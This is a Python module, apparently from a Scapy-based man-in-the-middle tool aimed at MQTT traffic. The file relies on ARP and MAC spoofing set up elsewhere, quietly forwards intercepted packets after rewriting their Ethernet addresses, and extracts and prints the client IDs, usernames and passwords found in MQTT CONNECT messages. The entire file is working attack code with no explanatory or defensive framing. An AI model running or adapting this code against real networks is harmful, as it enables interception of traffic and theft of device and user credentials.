from scapy.all import Packet, sendp
from scapy.contrib.mqtt import MQTT, MQTTConnect
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP
from .. import context
from ..config import MQTT_PORT


def process_MQTTConnect(packet: MQTT) -> None:

    # Get MQTT message layers
    connect: MQTTConnect = packet[MQTTConnect]
    client_id: bytes = connect.clientId
    username: bytes | None = connect.username
    password: bytes | None = connect.password

    # Detect credentials
    if client_id != b'' or username is not None or password is not None:

        client_id: str = client_id.decode()
        username: str = username.decode() if username is not None else ''
        password: str = password.decode() if password is not None else ''
        msg: str = 'Credentials found!\n'
        msg += f"Client ID: '{client_id}', "
        msg += f"Username: '{username}', "
        msg += f"Pasword: '{password}'"
        print(msg)

    return None


def packet_callback(packet: Packet) -> None:

    # Don't process not TCP packets
    if not packet.haslayer(TCP):
        return

    # Don't process packets sent by the own host
    if packet[Ether].src == context['OWN_MAC_ADDRESS']:
        return

    # Only process MQTT or MQTT-related TCP packets
    if packet[TCP].sport == MQTT_PORT or packet[TCP].dport == MQTT_PORT:
        msg: str = f"[{'='*20}Received MQTT packet.{'='*20}]\n"
        msg += f"FROM: "
        msg += f"{packet[Ether].src}/{packet[IP].src}/{packet[TCP].sport}\n"
        msg += f"TO: "
        msg += f"{packet[Ether].dst}/{packet[IP].dst}/{packet[TCP].dport}\n"
        print(msg)
    else:
        return

    # Revert MAC spoofing
    packet[Ether].src = context['OWN_MAC_ADDRESS']
    packet[Ether].dst = context['ARP_TABLE'].get(packet[IP].dst)

    if packet.haslayer(MQTTConnect):
        packet.show()
        process_MQTTConnect(packet)

    sendp(packet)
    return
